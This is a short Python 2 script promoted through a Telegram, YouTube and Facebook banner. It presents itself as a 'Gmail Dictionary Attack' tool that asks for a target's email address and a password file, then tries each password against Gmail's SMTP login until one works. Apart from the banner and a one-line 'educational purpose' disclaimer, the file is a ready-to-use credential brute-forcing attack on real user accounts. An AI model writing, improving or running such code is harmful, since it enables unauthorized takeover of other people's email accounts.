# Program: Gmail Dictionary Attack v2
Import colorama
print"Join TELEGRAM CHANNEL"
#Information
print "Author: KHALIL HUSSAINI"
print "YouTube - AFGHAN TECH"
print "FACEBOOOK- AFGHAN TECH"

print"      *                                            *   "
print"     *                                              *    "
print"    **                                              **   "
print"   *   **                                        **   *    "
print"   **   **  *                               *   **    **   "
print"   ***    * **    TELEGRAM-@KHALIL2231   **  *    ***  "
print"    ****    ******************************* ***   ****   "
print"       *******    *****        *******    **********  "
print"  ***********           *****             ************     "
print"    **********    *** * **   ** ****    **********     "
print"         ********** ** **     ** ****************    "
print"   *************** ** **  ***  **  **********************  "
print"        ******   ***************************   ******     "
print"                *************************    "
print"               **************************  "
print"               **** ** ** **** ** ** **  "
print"                ***  *  *  **  *  * ***   "
print"                 **                 **    "
print"                   *                *     "

print" Disclaimer- This tool is only for educational purpose"
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter the target's email address: ")
passwfile = raw_input("Enter the password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)

		print "[+] Password Found: %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[!] Password Incorrect: %s" % password
